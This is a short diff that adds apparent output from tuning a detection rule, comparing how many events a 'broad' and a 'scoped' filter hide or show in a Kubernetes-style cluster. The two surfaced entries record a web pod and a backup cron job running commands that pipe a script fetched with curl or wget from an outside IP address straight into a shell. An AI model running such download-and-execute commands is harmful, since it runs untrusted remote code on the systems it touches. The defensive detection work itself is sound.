@@ -1,0 +1,4 @@
+broad: hides 4, shows 0
+scoped: hides 2, shows 2
+   shop/web-6c9f8d7b5-x2k4q node -> sh -c curl -s http://203.0.113.50/x | sh
+   backup/db-backup-29550360 cron -> sh -c wget -qO- http://203.0.113.50/k | sh
